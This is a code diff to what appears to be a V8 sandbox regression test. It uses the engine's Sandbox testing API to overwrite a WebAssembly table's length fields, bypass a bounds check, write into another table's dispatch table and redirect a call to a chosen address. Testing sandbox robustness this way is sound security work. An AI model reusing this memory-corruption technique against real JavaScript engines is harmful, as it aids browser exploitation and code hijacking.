@@ -47,8 +47,9 @@ let { writer, dummy, boom, table_v_ls, table_v_ll } = instance.exports;
 
 // Prepare corruption utilities.
 const kHeapObjectTag = 1;
-const kWasmTableObjectCurrentLengthOffset = 16;
-const kWasmTableObjectMaximumLengthOffset = 20;
+const kWasmTableType = Sandbox.getInstanceTypeIdFor('WASM_TABLE_OBJECT_TYPE');
+const kWasmTableObjectCurrentLengthOffset = Sandbox.getFieldOffset(kWasmTableType, 'current_length');
+const kWasmTableObjectMaximumLengthOffset = Sandbox.getFieldOffset(kWasmTableType, 'maximum_length');
 let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
 function getPtr(obj) {
   return Sandbox.getAddressOf(obj) + kHeapObjectTag;
@@ -67,4 +68,4 @@ setField(getPtr(table_v_ls), kWasmTableObjectMaximumLengthOffset, kSmiMinusOne);
 // Check bypassed, write @ index -7 -> writes into table_v_ll dispatch table!
 table_v_ls.set(0xfffffff9, writer);
 
-boom(BigInt(Sandbox.targetPage) - 0x7n, 42n);
+boom(0x414141414141n, 42n);
